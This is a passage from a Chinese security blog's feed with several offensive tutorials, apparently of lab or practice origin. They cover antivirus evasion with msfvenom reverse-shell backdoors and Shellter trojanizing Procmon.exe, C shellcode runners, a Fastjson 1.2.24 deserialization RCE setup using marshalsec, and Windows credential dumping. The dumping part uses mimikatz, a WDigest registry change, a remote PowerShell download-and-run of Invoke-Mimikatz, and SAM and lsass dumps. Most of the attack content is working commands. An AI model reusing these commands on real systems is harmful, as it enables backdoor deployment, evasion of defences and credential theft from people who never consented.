指定包含一个额外的win32 shellcode文件    -x, --template        &lt;path&gt;        # 指定一个特定的可执行文件作为模板    -k, --keep                          # 保护模板程序的功能，注入的payload作为一个新的进程运行    -v, --var-name        &lt;value&gt;       # 指定一个变量名（当添加 -f 参数的时候，例如 -f python，那么输出为 python 代码， payload 会被按行格式化为 python 代码，追加到一个 python 变量中，这个参数即为指定 python 变量的变量名）    -t, --timeout         &lt;second&gt;      # 设置从STDIN读取payload的等待时间（默认为30,0为禁用）    -h, --help                          # 帮助</code></pre><h2 id="0xFE-参考"><a href="#0xFE-参考" class="headerlink" title="0xFE 参考"></a>0xFE 参考</h2><p><a href="https://www.freebuf.com/sectool/118714.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/118714.html</a><br><a href="https://blkwindy.top/2019/07/26/Metasploit%E2%80%94%E2%80%94msfvenom%E5%85%8D%E6%9D%80%E6%9C%A8%E9%A9%AC/" target="_blank" rel="noopener">https://blkwindy.top/2019/07/26/Metasploit%E2%80%94%E2%80%94msfvenom%E5%85%8D%E6%9D%80%E6%9C%A8%E9%A9%AC/</a><br><a href="https://www.freebuf.com/articles/system/227463.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/227463.html</a></p><h2 id="0xFF-C语言版shellcode"><a href="#0xFF-C语言版shellcode" class="headerlink" title="0xFF C语言版shellcode"></a>0xFF C语言版shellcode</h2><pre><code>unsigned char buf[] = &quot;shellcode is here&quot;;main(){    ( (void(*)(void))&amp;buf)();}</code></pre><pre><code>unsigned char buf[] = &quot;shellcode is here&quot;;main(){    Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);    memcpy(Memory, buf, sizeof(buf));    ((void(*)())Memory)();}</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> MSF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>免杀</title>
      <link href="/%E5%85%8D%E6%9D%80/"/>
      <url>/%E5%85%8D%E6%9D%80/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-免杀"><a href="#0x00-免杀" class="headerlink" title="0x00 免杀"></a>0x00 <strong>免杀</strong></h2><p>&ensp;&ensp;&ensp;&ensp;免杀技术，即反杀毒技术（Anti AntiVirus），简称免杀。一种能够让病毒木马免于被杀毒软件查杀的技术。——百度百科<br>&ensp;&ensp;&ensp;&ensp;Anti：反。AntiVirus：杀毒软件，简称AV。</p><h2 id="0x01-杀毒软件扫描技术"><a href="#0x01-杀毒软件扫描技术" class="headerlink" title="0x01 杀毒软件扫描技术"></a>0x01 杀毒软件扫描技术</h2><ol><li>基于文件扫描</li><li><ul><li>字符串扫描技术：匹配敏感字符与关键字</li></ul></li><li><ul><li>通配符扫描技术：利用正则表达式来匹配敏感字符串</li></ul></li><li><ul><li>不匹配字节数扫描技术：</li></ul></li><li><ul><li>散列扫描技术</li></ul></li><li><ul><li>书签检测法</li></ul></li><li><ul><li>首尾扫描检测法：只扫描文件头尾</li></ul></li><li><ul><li>入口点和固定点扫描</li></ul></li><li><ul><li>文件名扫描法</li></ul></li><li><ul><li>智能扫描法：替换多余字符</li></ul></li><li><ul><li>近似精确识别法：多特征码匹配识别、校验和</li></ul></li><li><ul><li>骨架扫描法</li></ul></li><li><ul><li>精确扫描法</li></ul></li><li>基于内存扫描</li><li>基于行为监控</li><li><ul><li>上传下载删除移动修改文件到关键目录中</li></ul></li><li><ul><li>修改网站、中间件、系统等原设置</li></ul></li><li><ul><li>自动启动、自动销毁等等</li></ul></li><li>云查杀与主动防御</li><li><ul><li>信任机制：数字签名技术、样本分析技术</li></ul></li><li><ul><li>分布式机制：与传染病毒的特点一样，云服务端检测到病毒存在后，更新病毒库，云中的所有客户端都获得相对应的反病毒技术。</li></ul></li><li><ul><li>代码仿真技术：通过虚拟机环境来模拟真实CPU与内存管理系统，让病毒在其中运行的过程，将可疑文件的内容拆分并逐一分析，最后执行。</li></ul></li><li>多引擎技术</li><li><ul><li>各产品查杀病毒的技术与角度都不一样，使用多种检测技术，更容易识别病毒。</li></ul></li></ol><h2 id="0x02-多引擎在线扫描病毒网站"><a href="#0x02-多引擎在线扫描病毒网站" class="headerlink" title="0x02 多引擎在线扫描病毒网站"></a>0x02 多引擎在线扫描病毒网站</h2><p><a href="https://www.virustotal.com/gui/home" target="_blank" rel="noopener">https://www.virustotal.com/gui/home</a><br><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a><br><a href="https://www.virscan.org/language/zh-cn/" target="_blank" rel="noopener">https://www.virscan.org/language/zh-cn/</a></p><h2 id="0x10-免杀技术"><a href="#0x10-免杀技术" class="headerlink" title="0x10 免杀技术"></a>0x10 <strong>免杀技术</strong></h2><h2 id="0x11-静态免杀"><a href="#0x11-静态免杀" class="headerlink" title="0x11 静态免杀"></a>0x11 静态免杀</h2><ol><li>修改特征码，相关工具：CCL、MYCCL、virtest，手工（有源码），OD，C32ASM，010Editor</li><li>加壳</li><li>shellcode编译<br><a href="https://anhkgg.com/aanti-virus/" target="_blank" rel="noopener">https://anhkgg.com/aanti-virus/</a></li></ol><h2 id="0x20-msfvenom生成后门文件"><a href="#0x20-msfvenom生成后门文件" class="headerlink" title="0x20 msfvenom生成后门文件"></a>0x20 msfvenom生成后门文件</h2><p><strong>MSF几个重要命令：</strong><br>2. msf&gt;set EnableStageEncoding true #尝试使用不同的编码器对stage进行编码<br>3. msf&gt;set stageencoder x86/fnstenv_mov<br>4. msf&gt;set stageencodingfallback false<br>5. msf&gt;set exitonsession false #防止session假死，会一直监听端口<br>6. msf&gt;set sessioncommunicationtimeout 0 #默认情况下，一个会话在5分钟内无任务活动就会杀死，设置为0防止被杀<br>7. msf|&gt;set sessionexpirationtimeout 0 #默认情况下，一个会话在一周后被强制关闭，设置为0可永久不会被关闭<br>8. sessions -l #查看所有会话<br>9. jobs #查看所有活动<br>10. exploit -j -z #-j：后台运行，-z：可持续监听<br>11. msf&gt;handler -H 192.168.100.4 -P 8888 -p windows/x64/meterpreter/reverse_tcp #简便监听<br>12. PrependMigrate=true PrependMIgrateProx=svchost.exe #使这个程序会默认迁移到svchost.exe进程</p><p><strong>常见后门文件</strong><br>2. msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.100.4 lport=8888 -f exe&gt;wmrt.exe</p><ol start="3"><li>火绒：</li><li><img src="/%E5%85%8D%E6%9D%80/1.png" alt></li><li>msfvenom -p windows/x64/shell/reverse_tcp_rc4 -e x86/shikata_ga_nai RC4PASSWORD=msf lhost=192.168.100.4 lport=8888 -f exe -o srtr.exe #火绒：不杀，360：上传不杀，执行就杀，以后都杀</li><li><img src="/%E5%85%8D%E6%9D%80/3.png" alt></li></ol><h2 id="捆绑工具shellter"><a href="#捆绑工具shellter" class="headerlink" title="捆绑工具shellter"></a><a href="https://www.shellterproject.com/" target="_blank" rel="noopener">捆绑工具shellter</a></h2><ol><li><p>shellter：一种动态shellcode注入工具（当前仅32位应用）。</p></li><li><p><a href="https://www.shellterproject.com/Downloads/Shellter/Readme.txt" target="_blank" rel="noopener">shellter使用帮助</a></p></li><li><p><img src="/%E5%85%8D%E6%9D%80/2.png" alt></p></li><li><p><strong>MSF开启监听：</strong></p></li><li><p>use exploit/multi/handler</p></li><li><p>set payload windows/meterpreter/reverse_tcp</p></li><li><p>set lhost 控制者IP</p></li><li><p>set lport 控制者port #默认4444</p></li><li><p>run</p></li><li><p><img src="/%E5%85%8D%E6%9D%80/4.png" alt></p></li><li><p><strong>测试应用<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procmon" target="_blank" rel="noopener">Procmon.exe</a>，先病毒扫描测试</strong></p></li><li><p><img src="/%E5%85%8D%E6%9D%80/9.png" alt></p></li><li><p><img src="/%E5%85%8D%E6%9D%80/10.png" alt></p></li><li><p><img src="/%E5%85%8D%E6%9D%80/11.png" alt></p></li><li><p><strong>依次执行命令</strong></p></li><li><p>双击运行shellter.exe</p></li><li><p>A #自动模式</p></li><li><p>N #不检测版本</p></li><li><p>指定Procmon.exe #Procmon.exe会被备份在Shellter_Backups目录下</p></li><li><p>L #列出payload</p></li><li><p>1 #指定哪个payload</p></li><li><p>控制者IP</p></li><li><p>控制者port</p></li><li><p>[回车]</p></li><li><p>shellter目录下就会生成新的Procmon.exe #跟Shellter_Backups目录下的原文件对比，文件大小较大</p></li><li><p>双击执行新的Procmon.exe，MSF就获取到会话</p></li><li><p><img src="/%E5%85%8D%E6%9D%80/12.png" alt></p></li><li><p><img src="/%E5%85%8D%E6%9D%80/5.png" alt="VirusTotal查杀"></p></li><li><p><img src="/%E5%85%8D%E6%9D%80/6.png" alt="virscan查杀"></p></li><li><p><img src="/%E5%85%8D%E6%9D%80/8.png" alt="threatbook查杀"></p></li><li><p><strong>使用msfvenom生成普通版payload：</strong></p></li><li><p>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.100.4 lport=4444 -f raw &gt;/root/tmp/shellter.raw #普通模式</p></li><li><p>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.100.4 lport=4444 -e x86/shikata_ga_nai -i 17 -b “\x00\xff” -f raw &gt;/root/tmp/shellter.raw #加密模式</p></li><li><p><strong>MSF开启监听</strong></p></li><li><p><strong>测试应用还是Procmon.exe，依次执行命令：</strong></p></li><li><p>步骤一样，L #列出payload</p></li><li><p>换成C #自定义payload</p></li><li><p>指定payload文件</p></li><li><p>N #非DLL加载</p></li><li><p>[回车] </p></li><li><p>双击执行新的Procmon.exe，MSF就获取到会话</p></li><li><p><img src="/%E5%85%8D%E6%9D%80/7.png" alt="VirusTotal查杀"></p></li><li><p><img src="/%E5%85%8D%E6%9D%80/12.png" alt="virscan查杀"></p></li><li><p><img src="/%E5%85%8D%E6%9D%80/13.png" alt="threatbook查杀"></p></li><li><p><strong>使用msfvenom生成加密版payload：</strong></p></li><li><p><img src="/%E5%85%8D%E6%9D%80/14.png" alt="virscan查杀"></p></li><li><p><img src="/%E5%85%8D%E6%9D%80/15.png" alt="threatbook查杀"></p></li><li><p><img src="/%E5%85%8D%E6%9D%80/16.png" alt="VirusTotal查杀"></p></li></ol><h2 id="avet"><a href="#avet" class="headerlink" title="avet"></a><a href="https://github.com/govolution/avet" target="_blank" rel="noopener">avet</a></h2><h2 id="Veil"><a href="#Veil" class="headerlink" title="Veil"></a><a href="https://github.com/Veil-Framework/Veil" target="_blank" rel="noopener">Veil</a></h2><ol><li>linux安装：apt -y install veil</li><li>/usr/share/veil/config/setup.sh –force –silent</li></ol><h2 id="0xFE-参考链接"><a href="#0xFE-参考链接" class="headerlink" title="0xFE 参考链接"></a>0xFE 参考链接</h2><p><a href="https://yara.readthedocs.io/en/stable/gettingstarted.html#" target="_blank" rel="noopener">https://yara.readthedocs.io/en/stable/gettingstarted.html#</a><br><a href="https://www.shellterproject.com/Downloads/Shellter/Readme.txt" target="_blank" rel="noopener">https://www.shellterproject.com/Downloads/Shellter/Readme.txt</a><br><a href="https://forum.90sec.com/t/topic/252" target="_blank" rel="noopener">https://forum.90sec.com/t/topic/252</a></p><h2 id="0xFF-帮助信息"><a href="#0xFF-帮助信息" class="headerlink" title="0xFF 帮助信息"></a>0xFF 帮助信息</h2><pre><code>Help: -h, --helpAction: Shows the command line help menu.List Payloads: --listAction: Shows a list of the embedded payloads.Verbose Mode: -vAction: Shows Real-Time Tracing.Operation Mode: -a / -mAction: Sets the Operation Mode to use.-a: Auto Mode, -m: Manual Mode. (See Remarks)Note: Manual Mode requires user interaction for all options.Online version check: --VersionCheckAction: Retrieves version information from the official website.Note: Requires internet connection. Not available in Wine mode.PE target: -f &lt;filename&gt;Action: Sets the PE target.Stealth Mode: -s / --stealthAction: Enables Stealth Mode feature. Preserves original functionality of        the infected PE file.Note: If this feature is enabled then --enc, --encode, and --handler IAT      are implied as set.Payload: -p &lt;filename&gt;/&lt;listed payload&gt;Action: Sets the payload. Must be in RAW format.Metasploit: generate -t raw.The following payloads can be used directly through Shellter.************* Payloads *************[1] Meterpreter_Reverse_TCP   [stager][2] Meterpreter_Reverse_HTTP  [stager][3] Meterpreter_Reverse_HTTPS [stager][4] Meterpreter_Bind_TCP      [stager][5] Shell_Reverse_TCP         [stager][6] Shell_Bind_TCP            [stager][7] WinExecExample: -p meterpreter_reverse_tcp --lhost 192.168.30.133 --port 4444LHOST: --lhost &lt;IP address&gt;/&lt;Domain Name&gt;Action: Sets the IP address or the Domain Name for the embedded payloads        that use reverse connection.Note: Domain names can be used with the reverse_http and reverse_https      payloads, or with custom payloads generated by the user.Port: --port &lt;Port number&gt;Action: Sets the port number for the embedded payloads that        either use reverse connection, or listen locally for        inbound connections.CMD: --cmd &lt;cmd argument&gt;Action: Sets the command to execute argument for the embedded        windows command execution payload.Example: -p winexec --cmd &quot;cmd.exe /c net user evil password /ADD&quot;Enable DLL Reflective Loader support: --reflective &lt;FuncName&gt;Action: Marks the payload as DLL and sets the reflective loader function.This flag automatically enables encoded-payload support because the loadermight require RW permissions to itself. You will have to set the --handlerargument as well.Note: Function names are case sensitive.Threads tracing: --trace main / allAction: Sets the threads to be traced.main: Main Thread, all: All Threads Tracing.Note: It is recommended to enable all threads tracing. This is enabled      by default when auto mode is used without command line arguments.Enable encoded-payload support: --encAction: Handles encoded payloads.Note: If you use an encoded payload, this flag is mandatory! However,      it is enabled by default when auto mode is used without command      line arguments.      It is recommended to always use encoded payloads, unless they      are completely custom, thus not known to AVs.Note: You can choose to apply Shellter&#39;s encoder by using the --encode      arument. It can also be used on top of already encoded payloads.Proprietary Shellter Encoding: --encode / --encode {&lt;encoding sequence&gt;}Action: Applies an extra encoding layer.        It is enabled by default when using auto mode without command        line arguments.********************************* Supported Encoding Operators *********************************XOR --&gt; xADD --&gt; +SUB --&gt; -NOT --&gt; !Example #1: x!+xNote: When the encoding sequence is defined from the command line, the      operators need to be enclosed between &#39;{}&#39;.      Example #2: --encode {x!+}Note: In Manual mode you must not include the &#39;{}&#39; characters, just as in the      first example shown above.Remarks: The number of operators defined, must be between a minimum of 1 and         a maximum of 12 operators.         If you just use the --encode switch without defining a custom         sequence of encoding operations, Shellter will randomly create         and apply an encoding scheme by itself.         If you enable stealth mode using --stealh/-s switches, then the         --encode switch is implied, but if you want to use a custom one         then you need to explicitly use the --encode switch as shown         in Example #2.Note: You will have to set the --handler argument as well.Note: If you set --encode switch, then --enc is implied as set.Encode using Dynamic Thread Context Key: --DTCKAction: Encodes the payload using dynamic thread context information.Note: This is an experimental feature that logs the content of some      CPU registers and then filters all that data in order to keep      injection locations where at least one of the logged registers      has a value that can be reliably used for encoding and later      for decoding the payload on runtime.Note: If you set this flag, then --encode and --enc are implied as set.      In Auto mode, this feature can only be activated by using command      line arguments.Proprietary Decoder Obfuscation: --polyDecoderAction: Obfuscates the decoder generated by Shellter using        Thread Context Aware Polymorphic code.Note: This only applies if --encode option has been set. It is      enabled by default when using auto mode without command      line arguments.Encoded Payload Handling Type: --handler iat / sectionAction: Defines how the encoded payload will be handled.iat: Use IAT pointers, section: Give to section RWE permissions.Note: If you use an encoded payload, this flag is mandatory! However,      when you use auto mode without command line arguments, this is      enabled by default.Obfuscate IAT type handler: --polyIATAction: Enables obfuscation of IAT type handlers for encoded payloads        using Thread Context Aware Polymorphic code.Note: Contributes towards a much more polymorphic output! It is enabled      by default when using auto mode without command line arguments.Generate &amp; Bind PolyMorphic Junk Code: --junkAction: Enables PolyMorphic Junk Code.Note: It is recommended to enable this option in order to produce      a more complex output. This type of code added also serves      for timing-out some emulators and sandboxes. You might have      to wait for a few seconds before the payload gets executed.Note: This feature is enabled by default when using automode without      command line arguments.Remarks:i. When running inside Wine, the compatible Engine is selected automatically.ii. If Manual Mode has been selected, all other options are ignored.iii. If no Operation Mode (-a/-m) has been selected though command line,     then Auto Mode applies.iv. If &#39;--enc&#39; and/or &#39;--encode&#39; and/or --DTCK are set, then &#39;--handler&#39; must    be also set.v. Tracing of all threads is enabled by default when using the Auto Mode.   You can disable it by specifying &#39;--trace main&#39; -Not Recommended-.vi. If Stealth Mode is enabled (-s/--stealth), the injected payload will    always be encoded by Shellter and --handler IAT is set by default.vii. Arguments can be passed in any order. If the same argument is used more     than once, then only the first occurence is taken in consideration.</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
            <tag> 绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNS域传送漏洞</title>
      <link href="/DNS%E5%9F%9F%E4%BC%A0%E9%80%81/"/>
      <url>/DNS%E5%9F%9F%E4%BC%A0%E9%80%81/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-DNS"><a href="#0x00-DNS" class="headerlink" title="0x00 DNS"></a>0x00 DNS</h2><p>&ensp;&ensp;&ensp;&ensp;DNS：Domain Name System，域名系统（服务）协议，是一种分布式网络目录服务，主要用于域名与IP地址的相互转换，以及控制因特网的电子邮件的发送。<br><img src="/DNS%E5%9F%9F%E4%BC%A0%E9%80%81/1.png" alt></p><h2 id="0x01-DNS记录分类"><a href="#0x01-DNS记录分类" class="headerlink" title="0x01 DNS记录分类"></a>0x01 DNS记录分类</h2><ol><li>A记录：ip地址记录，记录一个域名对应的IP地址</li><li>AAAA记录：IPv6地址记录，记录一个域名对应的IPv6地址</li><li>CNAME记录：别名记录，记录一个主机的别名</li><li>MX记录：电子邮件交换记录，记录一个邮件域名对应的IP地址，如：<a href="mailto:123@qwe.com" target="_blank" rel="noopener">123@qwe.com</a>，域名为qwe.com，邮件服务器对应的IP地址</li><li>NS记录：域名服务器记录，记录该域名由哪台域名服务器解析</li><li>PTR记录：反向记录，即从IP地址到域名的一条记录</li><li>TXT记录：记录域名的相关文本信息</li><li>SOA记录：start of anthority，开始授权</li></ol><h2 id="0x02-DNS域传送漏洞危害"><a href="#0x02-DNS域传送漏洞危害" class="headerlink" title="0x02 DNS域传送漏洞危害"></a>0x02 DNS域传送漏洞危害</h2><ol><li>DNS服务器分：主服务器、备份服务器、缓存服务器。</li><li>主备服务器之间同步数据库，需要使用DNS域传送，即备用服务器从主服务器拷贝数据，得到数据并更新数据。</li><li>如果DNS服务器配置不当，可能被匿名用户获取某个域的所有记录，造成网络拓扑结构泄露，可能包含安全较低的内部主机，测试服务器。</li><li>攻击者利用DNS域传送漏洞：</li><li>可以获取某个域的网络拓扑，IP段</li><li>容易获取各种服务器的IP地址，数据库服务器、测试服务器、VPN服务器等等</li></ol><h2 id="0x03-DNS域传送漏洞检测"><a href="#0x03-DNS域传送漏洞检测" class="headerlink" title="0x03 DNS域传送漏洞检测"></a>0x03 DNS域传送漏洞检测</h2><ol><li>&gt;nslookup</li><li>&gt;server [dns.domain] #使用server参数指定查询要使用的DNS服务器，如：8.8.8.8,114.114.114.114，dns1.qwe.asd.zxc</li><li>&gt;ls domain #列出某个域的所有域名</li></ol><h2 id="0x04-nmap扫描DNS域传送漏洞"><a href="#0x04-nmap扫描DNS域传送漏洞" class="headerlink" title="0x04 nmap扫描DNS域传送漏洞"></a>0x04 nmap扫描DNS域传送漏洞</h2><ol><li><code>nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=[domain] -p 53 -Pn [dns.domain]</code></li></ol><h2 id="0x05-dig检测DNS域传送漏洞"><a href="#0x05-dig检测DNS域传送漏洞" class="headerlink" title="0x05 dig检测DNS域传送漏洞"></a>0x05 dig检测DNS域传送漏洞</h2><ol><li>dig [domain] ns #获取解析域名的dns服务器，如：dns1.domain</li><li>dig axfr @dns1.domain [domain]</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ASCII码表</title>
      <link href="/ASCII%E7%A0%81%E8%A1%A8/"/>
      <url>/ASCII%E7%A0%81%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<p><img src="/ASCII%E7%A0%81%E8%A1%A8/2.png" alt><br><img src="/ASCII%E7%A0%81%E8%A1%A8/1.png" alt></p>]]></content>
      
      
      
        <tags>
            
            <tag> 知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson</title>
      <link href="/Fastjson/"/>
      <url>/Fastjson/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-Fastjson"><a href="#0x00-Fastjson" class="headerlink" title="0x00 Fastjson"></a>0x00 Fastjson</h2><p><img src="/Fastjson/1.jpg" alt></p><ol><li>Fastjson， 是一个 Java 库，可用于将 Java 对象转换为其 JSON 表示形式。它还可用于将 JSON 字符串转换为等效的 Java 对象。Fastjson 可以处理任意 Java 对象，包括您没有的预先存在的对象。</li></ol><h2 id="0x10-fastjson-1-2-24反序列化导致任意命令执行漏洞"><a href="#0x10-fastjson-1-2-24反序列化导致任意命令执行漏洞" class="headerlink" title="0x10 fastjson 1.2.24反序列化导致任意命令执行漏洞"></a>0x10 fastjson 1.2.24反序列化导致任意命令执行漏洞</h2><ol><li>CVE-2017-18349</li><li>漏洞原因：fastjson在解析json的过程中，支持使用autotype来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</li></ol><h2 id="0x11-环境"><a href="#0x11-环境" class="headerlink" title="0x11 环境"></a>0x11 环境</h2><ol><li><a href="https://vulhub.org/#/environments/fastjson/1.2.24-rce/" target="_blank" rel="noopener">https://vulhub.org/#/environments/fastjson/1.2.24-rce/</a></li><li>docker-compose up -d </li><li>访问<a href="http://IP:8090/" target="_blank" rel="noopener">http://IP:8090/</a></li><li><img src="/Fastjson/1.png" alt></li><li>抓包拦截发送</li><li><img src="/Fastjson/2.png" alt></li><li><img src="/Fastjson/3.png" alt></li></ol><p><strong>编译测试代码生成class文件</strong></p><pre><code>// javac test.javaimport java.lang.Runtime;import java.lang.Process;public class test {    static {        try {            Runtime rt = Runtime.getRuntime();            String[] commands = {&quot;touch&quot;, &quot;/tmp/test&quot;};            Process pc = rt.exec(commands);            pc.waitFor();        } catch (Exception e) {            // do nothing        }    }}</code></pre><ol><li>javac test.java</li><li>windows部署maven环境</li><li>利用<a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">marshalsec项目</a>，搭建rmi服务器，监听9999端口</li><li>下载<a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">marshalsec项目</a>，进入marshalsec目录，使用命令编译出marshalsec的jar包：</li><li>mvn clean package -DskipTests</li><li><img src="/Fastjson/4.png" alt></li><li><img src="/Fastjson/5.png" alt></li><li>本地启动tomcat环境，把test.class文件放到web根目录下，搭建rmi服务器，监听9999端口</li><li>java -cp .\target\marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer “<a href="http://192.168.100.1:8080/#test&quot;" target="_blank" rel="noopener">http://192.168.100.1:8080/#test&quot;</a> 9999</li><li><img src="/Fastjson/7.png" alt></li></ol><h2 id="0x12-利用"><a href="#0x12-利用" class="headerlink" title="0x12 利用"></a>0x12 利用</h2><ol><li>因为目标环境是Java 8u102，没有com.sun.jndi.rmi.object.trustURLCodebase的限制，我们可以使用com.sun.rowset.JdbcRowSetImpl的利用链，借助JNDI注入来执行命令。</li><li></li></ol><h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol><li><a href="https://vulhub.org/#/environments/fastjson/1.2.24-rce/" target="_blank" rel="noopener">https://vulhub.org/#/environments/fastjson/1.2.24-rce/</a></li><li><a href="https://www.freebuf.com/vuls/208339.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/208339.html</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> CVE </tag>
            
            <tag> vulhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows之凭证</title>
      <link href="/Windows%E4%B9%8B%E5%87%AD%E8%AF%81/"/>
      <url>/Windows%E4%B9%8B%E5%87%AD%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-windows凭证"><a href="#0x00-windows凭证" class="headerlink" title="0x00 windows凭证"></a>0x00 windows凭证</h2><h2 id="0x01-NTLM认证"><a href="#0x01-NTLM认证" class="headerlink" title="0x01 NTLM认证"></a>0x01 NTLM认证</h2><ol><li>登录时，用户输入的账号密码经过散列算法加密后，存储在\windows\system32\config\sam文件，用户在登录界面输入密码后，winlogon.exe接收用户输入，然后把密码传给lsass.exe，将密码转成NT Hash，然后与文件中已有的散列值比较。</li></ol><h2 id="0x10-mimikatz"><a href="#0x10-mimikatz" class="headerlink" title="0x10 mimikatz"></a>0x10 <a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">mimikatz</a></h2><ol><li><strong>mimikatz</strong>，可以从内存中提取密码，hash，PIN码，kerberos票据。还可以传递hash，传递票据，构建黄金票据。</li><li>下载<a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">mimikatz</a></li><li><img src="/Windows%E4%B9%8B%E5%87%AD%E8%AF%81/1.png" alt></li><li></li><li><strong>cmd执行命令：</strong></li><li>mimikatz.exe</li><li>log #日志记录输出到文件</li><li>privilege::debug</li><li>sekurlsa::logonpasswords #读密码</li><li><img src="/Windows%E4%B9%8B%E5%87%AD%E8%AF%81/2.png" alt></li><li>windows 10或windows server 2012 R2以上，默认内存缓存中禁止保存明文密码，会显示null</li><li><img src="/Windows%E4%B9%8B%E5%87%AD%E8%AF%81/3.png" alt></li><li>修改注册表，重新登录才可以抓取明文</li><li>reg add hklm\system\currentcontrolset\control\securityproviders\wdigest /v uselogoncredential /t reg_dword /d 1 /f</li><li><img src="/Windows%E4%B9%8B%E5%87%AD%E8%AF%81/4.png" alt></li><li></li><li><strong>各种方式运行mimikatz</strong></li><li>直接上传mimikatz，会被杀软杀掉</li><li><strong>powershell调用本地脚本</strong></li><li>powershell -exec bypass “import-module ./Invoke-Mimikatz.ps1;invoke-mimikatz” #管理员身份cmd执行</li><li>powershell -exec bypass “import-module ./Invoke-Mimikatz.ps1;invoke-mimikatz” &gt;1.txt #无反应时直接输出到txt文件，读文件</li><li><img src="/Windows%E4%B9%8B%E5%87%AD%E8%AF%81/15.png" alt></li><li><strong>powershell调用远程脚本</strong></li><li>powershell iex(new-object net.webclient).downloadstring(‘<a href="http://192.168.100.1/invoke-mimikatz.ps1&#39;);invoke-mimikatz" target="_blank" rel="noopener">http://192.168.100.1/invoke-mimikatz.ps1&#39;);invoke-mimikatz</a></li><li><img src="/Windows%E4%B9%8B%E5%87%AD%E8%AF%81/16.png" alt></li><li>这样还是会被杀软杀掉</li><li><img src="/Windows%E4%B9%8B%E5%87%AD%E8%AF%81/17.png" alt></li><li>拆分绕过：待续</li></ol><h2 id="0x11-命令行：Getpass-Getpass-cmd-PwDump7"><a href="#0x11-命令行：Getpass-Getpass-cmd-PwDump7" class="headerlink" title="0x11 命令行：Getpass/Getpass_cmd/PwDump7"></a>0x11 命令行：Getpass/Getpass_cmd/PwDump7</h2><ol><li>管理员身份运行cmd执行Getpass.exe即可，但有的只支持32位系统</li><li><img src="/Windows%E4%B9%8B%E5%87%AD%E8%AF%81/6.png" alt></li><li>管理员身份运行cmd执行PwDump7.exe即可</li><li><img src="/Windows%E4%B9%8B%E5%87%AD%E8%AF%81/11.png" alt></li></ol><h2 id="0x12-命令行：QuarksPwDump"><a href="#0x12-命令行：QuarksPwDump" class="headerlink" title="0x12 命令行：QuarksPwDump"></a>0x12 命令行：QuarksPwDump</h2><ol><li>cmd执行命令：</li><li>QuarksPwDump.exe –dump-hash-local #导出本地用户hash</li><li><img src="/Windows%E4%B9%8B%E5%87%AD%E8%AF%81/5.png" alt></li><li>QuarksPwDump.exe –dump-hash-domain –ntds-file c:\ntds.dit #配合ntdsutil导出域用户hash</li></ol><h2 id="0x20-命令行：利用注册表导出注册表配置单元，cain破解出hash"><a href="#0x20-命令行：利用注册表导出注册表配置单元，cain破解出hash" class="headerlink" title="0x20 命令行：利用注册表导出注册表配置单元，cain破解出hash"></a>0x20 命令行：利用注册表导出注册表配置单元，cain破解出hash</h2><ol><li><strong>管理员身份运行cmd执行命令</strong></li><li>reg save hklm\system system.hiv</li><li>reg save hklm\sam sam.hiv</li><li>reg save hklm\security security.hiv</li><li><img src="/Windows%E4%B9%8B%E5%87%AD%E8%AF%81/7.png" alt></li><li>使用<strong>cain</strong>导入hiv文件获取缓存中的凭证：LSA分析——加号——从注册表hive文件处导入分析（win2003可以）</li><li><img src="/Windows%E4%B9%8B%E5%87%AD%E8%AF%81/8.png" alt></li><li>或者破解器——LM&amp;NTLM密文——加号——导入sam.hive文件（win2003可以）</li><li><img src="/Windows%E4%B9%8B%E5%87%AD%E8%AF%81/9.png" alt></li></ol><h2 id="0x21-命令行：利用注册表导出注册表配置单元，mimikatz导出hash"><a href="#0x21-命令行：利用注册表导出注册表配置单元，mimikatz导出hash" class="headerlink" title="0x21 命令行：利用注册表导出注册表配置单元，mimikatz导出hash"></a>0x21 命令行：利用注册表导出注册表配置单元，mimikatz导出hash</h2><ol><li><strong>进入mimikatz目录，管理员身份运行cmd执行命令</strong></li><li>reg save hklm\system system.hiv</li><li>reg save hklm\sam sam.hiv</li><li>mimikatz.exe</li><li>lsadump::sam /system:system.hiv /sam:sam.hiv</li><li><img src="/Windows%E4%B9%8B%E5%87%AD%E8%AF%81/10.png" alt></li></ol><h2 id="0x30-lsass-exe"><a href="#0x30-lsass-exe" class="headerlink" title="0x30 lsass.exe"></a>0x30 lsass.exe</h2><ol><li>任务管理器转储lsass.exe</li><li>任务管理器——进程——显示所有用户的进程——找到lsass.exe——右键——创建转储文件</li><li><img src="/Windows%E4%B9%8B%E5%87%AD%E8%AF%81/14.png" 